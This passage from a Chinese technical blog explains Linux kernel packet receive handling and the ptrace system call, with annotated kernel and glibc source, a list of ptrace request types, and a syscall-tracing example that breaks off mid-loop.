class="comment">/* 调用接收设备的rx_handler */</span></span><br><span class="line">	rx_handler = rcu_dereference(skb-&gt;dev-&gt;rx_handler);</span><br><span class="line">	<span class="keyword">if</span> (rx_handler) &#123;</span><br><span class="line">		<span class="keyword">if</span> (pt_prev) &#123;</span><br><span class="line">			ret = deliver_skb(skb, pt_prev, orig_dev);</span><br><span class="line">			pt_prev = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">switch</span> (rx_handler(&amp;skb)) &#123;</span><br><span class="line">		<span class="keyword">case</span> RX_HANDLER_CONSUMED:</span><br><span class="line">			ret = NET_RX_SUCCESS;</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		<span class="keyword">case</span> RX_HANDLER_ANOTHER:</span><br><span class="line">			<span class="keyword">goto</span> another_round;</span><br><span class="line">		<span class="keyword">case</span> RX_HANDLER_EXACT:</span><br><span class="line">			deliver_exact = <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">case</span> RX_HANDLER_PASS:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			BUG();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(skb_vlan_tag_present(skb))) &#123;</span><br><span class="line">		<span class="keyword">if</span> (skb_vlan_tag_get_id(skb))</span><br><span class="line">			skb-&gt;pkt_type = PACKET_OTHERHOST;</span><br><span class="line">		skb-&gt;vlan_tci = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">/* 根据skb-&gt;protocol传递给上层协议(其实这就是&quot;sk_buff=&gt;packet_type&quot;的过程) */</span></span><br><span class="line">	type = skb-&gt;protocol;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (likely(!deliver_exact)) &#123; <span class="comment">/* 根据全局定义的协议处理报文 */</span></span><br><span class="line">		deliver_ptype_list_skb(skb, &amp;pt_prev, orig_dev, type,</span><br><span class="line">				       &amp;ptype_base[ntohs(type) &amp;</span><br><span class="line">						   PTYPE_HASH_MASK]); <span class="comment">/* 利用skb-&gt;protocol在ptype_base中选择对应的双向链表 */</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	deliver_ptype_list_skb(skb, &amp;pt_prev, orig_dev, type,</span><br><span class="line">			       &amp;orig_dev-&gt;ptype_specific); <span class="comment">/* 根据设备上注册的协议进行处理 */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(skb-&gt;dev != orig_dev)) &#123; <span class="comment">/* 如果设备发生变化,那么还需要针对新设备的注册协议进行处理 */</span></span><br><span class="line">		deliver_ptype_list_skb(skb, &amp;pt_prev, orig_dev, type,</span><br><span class="line">				       &amp;skb-&gt;dev-&gt;ptype_specific); </span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pt_prev) &#123; </span><br><span class="line">		<span class="keyword">if</span> (unlikely(skb_orphan_frags_rx(skb, GFP_ATOMIC)))</span><br><span class="line">			<span class="keyword">goto</span> drop;</span><br><span class="line">		*ppt_prev = pt_prev; <span class="comment">/* 把查找到的packet_type传出 */</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">drop:</span><br><span class="line">		<span class="keyword">if</span> (!deliver_exact)</span><br><span class="line">			atomic_long_inc(&amp;skb-&gt;dev-&gt;rx_dropped);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			atomic_long_inc(&amp;skb-&gt;dev-&gt;rx_nohandler);</span><br><span class="line">		kfree_skb(skb);</span><br><span class="line">		ret = NET_RX_DROP;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>__netif_receive_skb_core</code> 函数主要有几个处理：</p>
<ul>
<li>vlan 报文的处理，主要是循环把 vlan 头剥掉（Virtual Local Area Network 虚拟局域网）</li>
<li>交给 rx_handler 处理（例如：OVS，linux bridge 等）</li>
<li><code>ptype_all</code> 处理（例如：抓包程序，raw socket 等）</li>
<li><code>ptype_base</code> 处理，并交给协议栈（例如：ip、arp，rarp 等）</li>
</ul>
<p>其中我们只需要关注与有关 <code>ptype_base</code> 的部分，这里才是对网络协议的处理：</p>
<ul>
<li>程序会通过 <code>skb-&gt;protocol</code> 找到 <code>ptype_base</code> 中对应的双向链表</li>
<li>遍历这个双向链表，直到 <code>packet_type-&gt;type == sk_buff-&gt;protocol</code></li>
<li>然后调用 <code>packet_type-&gt;func</code> 完成对数据包的处理</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/01/Linux%20ptrace-%E5%8E%9F%E7%90%86%E5%92%8C%E8%BF%90%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/01/Linux%20ptrace-%E5%8E%9F%E7%90%86%E5%92%8C%E8%BF%90%E7%94%A8/" class="post-title-link" itemprop="url">Linux ptrace-原理和运用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-11-01 22:35:49" itemprop="dateCreated datePublished" datetime="2022-11-01T22:35:49+08:00">2022-11-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-31 14:29:42" itemprop="dateModified" datetime="2023-03-31T14:29:42+08:00">2023-03-31</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>12k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>11 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Linux 系统调用 - ptrace</strong></p>
<p>ptrace 是 Linux 中的一个系统调用，可以让父进程控制子进程运行，并可以检查和改变子进程的核心 image 的功能 </p>
<p>其基本原理是：</p>
<ul>
<li>当使用了 ptrace 跟踪后，所有发送给被跟踪的子进程的信号（除了SIGKILL），都会被转发给父进程</li>
<li>子进程会被阻塞，这时子进程的状态就会被系统标注为 TASK_TRACED</li>
<li>父进程收到信号后，就可以对停止下来的子进程进行检查和修改，然后让子进程继续运行 </li>
</ul>
<p>ptrace 在用户态的定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">ptrace</span> <span class="params">(<span class="keyword">enum</span> __ptrace_request request, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">long</span> <span class="keyword">int</span> res, ret;</span><br><span class="line">  va_list ap;</span><br><span class="line">  <span class="keyword">pid_t</span> pid;</span><br><span class="line">  <span class="keyword">void</span> *addr, *data;</span><br><span class="line"></span><br><span class="line">  va_start (ap, request);</span><br><span class="line">  pid = va_arg (ap, <span class="keyword">pid_t</span>);</span><br><span class="line">  addr = va_arg (ap, <span class="keyword">void</span> *);</span><br><span class="line">  data = va_arg (ap, <span class="keyword">void</span> *);</span><br><span class="line">  va_end (ap);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (request &gt; <span class="number">0</span> &amp;&amp; request &lt; <span class="number">4</span>)</span><br><span class="line">    data = &amp;ret;</span><br><span class="line"></span><br><span class="line">  res = INLINE_SYSCALL (ptrace, <span class="number">4</span>, request, pid, addr, data);</span><br><span class="line">  <span class="keyword">if</span> (res &gt;= <span class="number">0</span> &amp;&amp; request &gt; <span class="number">0</span> &amp;&amp; request &lt; <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于不同的 ptrace 命令有着不同的参数，简化版本如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ptrace</span><span class="params">(<span class="keyword">enum</span> __ptrace_request request, <span class="keyword">pid_t</span> pid, <span class="keyword">void</span> *addr, <span class="keyword">void</span> *data)</span></span>;   </span><br></pre></td></tr></table></figure>
<ul>
<li>enum __ptrace_request request：指示了 ptrace 要执行的命令</li>
<li>pid_t pid：指示 ptrace 要跟踪的进程ID</li>
<li>void *addr：指示要监控的内存地址</li>
<li>void *data：存放读取出的或者要写入的数据</li>
</ul>
<p>ptrace 在内核中的接口如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE4(ptrace, <span class="keyword">long</span>, request, <span class="keyword">long</span>, pid, <span class="keyword">unsigned</span> <span class="keyword">long</span>, addr,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span>, data)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">child</span>;</span></span><br><span class="line">	<span class="keyword">long</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (request == PTRACE_TRACEME) &#123;</span><br><span class="line">		ret = ptrace_traceme();</span><br><span class="line">		<span class="keyword">if</span> (!ret)</span><br><span class="line">			arch_ptrace_attach(current);</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	child = find_get_task_by_vpid(pid);</span><br><span class="line">	<span class="keyword">if</span> (!child) &#123;</span><br><span class="line">		ret = -ESRCH;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (request == PTRACE_ATTACH || request == PTRACE_SEIZE) &#123;</span><br><span class="line">		ret = ptrace_attach(child, request, addr, data);</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Some architectures need to do book-keeping after</span></span><br><span class="line"><span class="comment">		 * a ptrace attach.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (!ret)</span><br><span class="line">			arch_ptrace_attach(child);</span><br><span class="line">		<span class="keyword">goto</span> out_put_task_struct;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = ptrace_check_attach(child, request == PTRACE_KILL ||</span><br><span class="line">				  request == PTRACE_INTERRUPT);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> out_put_task_struct;</span><br><span class="line"></span><br><span class="line">	ret = arch_ptrace(child, request, addr, data);</span><br><span class="line">	<span class="keyword">if</span> (ret || request != PTRACE_DETACH)</span><br><span class="line">		ptrace_unfreeze_traced(child);</span><br><span class="line"></span><br><span class="line"> out_put_task_struct:</span><br><span class="line">	put_task_struct(child);</span><br><span class="line"> out:</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>其中对 PTRACE_TRACEME 和 PTRACE_ATTACH 做了特殊处理</li>
</ul>
<p>常见 ptrace 命令如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Type of the REQUEST argument to `ptrace.&#x27;  */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">ptrace_request</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* 跟踪发出此请求的进程,此过程接收的所有信号都可以被其父级拦截,其父级可以使用其他&quot;ptrace&quot;请求 */</span></span><br><span class="line">  PTRACE_TRACEME = <span class="number">0</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_TRACE_ME PTRACE_TRACEME</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 返回进程text空间中,地址ADDR处的word(字) */</span></span><br><span class="line">  PTRACE_PEEKTEXT = <span class="number">1</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_READ_I PTRACE_PEEKTEXT</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 返回进程data空间中,地址ADDR处的word(字) */</span></span><br><span class="line">  PTRACE_PEEKDATA = <span class="number">2</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_READ_D PTRACE_PEEKDATA</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 返回进程用户区域中,偏移为ADDR的word(字) */</span></span><br><span class="line">  PTRACE_PEEKUSER = <span class="number">3</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_READ_U PTRACE_PEEKUSER</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 将一字大小的DATA写入进程的text空间,地址为ADDR */</span></span><br><span class="line">  PTRACE_POKETEXT = <span class="number">4</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_WRITE_I PTRACE_POKETEXT</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 将一字大小的DATA写入进程的data空间,地址为ADDR */</span></span><br><span class="line">  PTRACE_POKEDATA = <span class="number">5</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_WRITE_D PTRACE_POKEDATA</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 将一字大小的DATA写入进程的用户区域,偏移量为ADDR */</span></span><br><span class="line">  PTRACE_POKEUSER = <span class="number">6</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_WRITE_U PTRACE_POKEUSER</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 继续该process(进程) */</span></span><br><span class="line">  PTRACE_CONT = <span class="number">7</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_CONTINUE PTRACE_CONT</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 杀死该process(进程) */</span></span><br><span class="line">  PTRACE_KILL = <span class="number">8</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_KILL PTRACE_KILL</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 单步执行该process(进程) */</span></span><br><span class="line">  PTRACE_SINGLESTEP = <span class="number">9</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_STEP PTRACE_SINGLESTEP</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 附加到正在运行的进程 */</span></span><br><span class="line">  PTRACE_ATTACH = <span class="number">16</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_ATTACH PTRACE_ATTACH</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 从附加到&#x27;PTRACE_ATTACH&#x27;的进程中分离 */</span></span><br><span class="line">  PTRACE_DETACH = <span class="number">17</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_DETACH PTRACE_DETACH</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 继续并在进入系统调用或从系统调用返回时停止 */</span></span><br><span class="line">  PTRACE_SYSCALL = <span class="number">24</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_SYSCALL PTRACE_SYSCALL</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 设置跟踪筛选器选项 */</span></span><br><span class="line">  PTRACE_SETOPTIONS = <span class="number">0x4200</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_SETOPTIONS PTRACE_SETOPTIONS</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 获取最后一条ptrace消息 */</span></span><br><span class="line">  PTRACE_GETEVENTMSG = <span class="number">0x4201</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_GETEVENTMSG PTRACE_GETEVENTMSG</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 获取流程的siginfo(签名信息) */</span></span><br><span class="line">  PTRACE_GETSIGINFO = <span class="number">0x4202</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_GETSIGINFO PTRACE_GETSIGINFO</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 为进程设置新的siginfo(签名信息) */</span></span><br><span class="line">  PTRACE_SETSIGINFO = <span class="number">0x4203</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_SETSIGINFO PTRACE_SETSIGINFO</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 获取寄存器内容 */</span></span><br><span class="line">  PTRACE_GETREGSET = <span class="number">0x4204</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_GETREGSET PTRACE_GETREGSET</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 设置寄存器内容 */</span></span><br><span class="line">  PTRACE_SETREGSET = <span class="number">0x4205</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_SETREGSET PTRACE_SETREGSET</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 类似于&#x27;PTRACE_ATTACH&#x27;,但不要强迫跟踪trap(陷阱),也不会影响signal(信号)或group stop state(组停止状态) */</span></span><br><span class="line">  PTRACE_SEIZE = <span class="number">0x4206</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_SEIZE PTRACE_SEIZE</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 陷阱捕获了tracee  */</span></span><br><span class="line">  PTRACE_INTERRUPT = <span class="number">0x4207</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_INTERRUPT PTRACE_INTERRUPT</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 等待下一个group event(事件组) */</span></span><br><span class="line">  PTRACE_LISTEN = <span class="number">0x4208</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_LISTEN PTRACE_LISTEN</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 检索siginfo_t结构,而无需从队列中删除信号 */</span></span><br><span class="line">  PTRACE_PEEKSIGINFO = <span class="number">0x4209</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_PEEKSIGINFO PTRACE_PEEKSIGINFO</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 获取被阻止信号的掩码 */</span></span><br><span class="line">  PTRACE_GETSIGMASK = <span class="number">0x420a</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_GETSIGMASK PTRACE_GETSIGMASK</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 更改被阻止信号的掩码 */</span></span><br><span class="line">  PTRACE_SETSIGMASK = <span class="number">0x420b</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_SETSIGMASK PTRACE_SETSIGMASK</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 获取seccomp BPF筛选器 */</span></span><br><span class="line">  PTRACE_SECCOMP_GET_FILTER = <span class="number">0x420c</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_SECCOMP_GET_FILTER PTRACE_SECCOMP_GET_FILTER</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 获取seccomp BPF筛选器元数据 */</span></span><br><span class="line">  PTRACE_SECCOMP_GET_METADATA = <span class="number">0x420d</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_SECCOMP_GET_METADATA PTRACE_SECCOMP_GET_METADATA</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 获取有关系统调用的信息 */</span></span><br><span class="line">  PTRACE_GET_SYSCALL_INFO = <span class="number">0x420e</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_GET_SYSCALL_INFO PTRACE_GET_SYSCALL_INFO</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>ptrace 的使用 - 调试</strong></p>
<p>Linux 调试工具 GDB 的底层就是使用了 ptrace，主要是 PTRACE_ATTACH 功能</p>
<p>在使用 ptrace 之前需要在两个进程间建立追踪关系：（追踪者 tracer 和被追踪者 tracee）</p>
<ul>
<li>ptrace 编程的主要部分是 tracer，它可以通过附着的方式与 tracee 建立追踪关系</li>
<li>建立之后，可以控制 tracee 在特定的时候暂停并向 tracer 发送相应信号，而 tracer 则通过循环等待 waitpid 来处理 tracee 发来的信号</li>
</ul>
<p>其中会用到4个 ptrace 命令：</p>
<ul>
<li>PTRACE_TRACEME：tracee 表明自己想要被追踪，这会自动与父进程建立追踪关系（这也是唯一能被 tracee 使用的 request，其他的 request 都由 tracer 指定）</li>
<li>PTRACE_PEEKUSER：返回进程用户区域中，偏移为ADDR处，一字大小的数据，使用 <code>ORIG_RAX</code> 计算 <code>RAX</code> 的偏移，从而获取将要执行的系统调用号</li>
<li>PTRACE_GETREGS：获取寄存器内容，用结构体 <code>user_regs_struct</code> 进行保存</li>
<li>PTRACE_SYSCALL：在子进程进入和退出系统调用时都将其暂停</li>
</ul>
<p>使用 ptrace 的编程案例如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> child;</span><br><span class="line">    <span class="keyword">long</span> syscallID;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">int</span> calling = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    child = fork();</span><br><span class="line">    <span class="keyword">if</span>(child == <span class="number">0</span>) &#123;</span><br><span class="line">        ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">/* tracee表明自己想要被追踪 */</span></span><br><span class="line">        execl(<span class="string">&quot;./HelloWorld&quot;</span>, <span class="string">&quot;HelloWorld&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">            wait(&amp;status);</span><br><span class="line">            <span class="keyword">if</span>(WIFEXITED(status))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            syscallID = ptrace(PTRACE_PEEKUSER, child, <span class="number">8</span> * ORIG_RAX, <span class="number">0</span>); 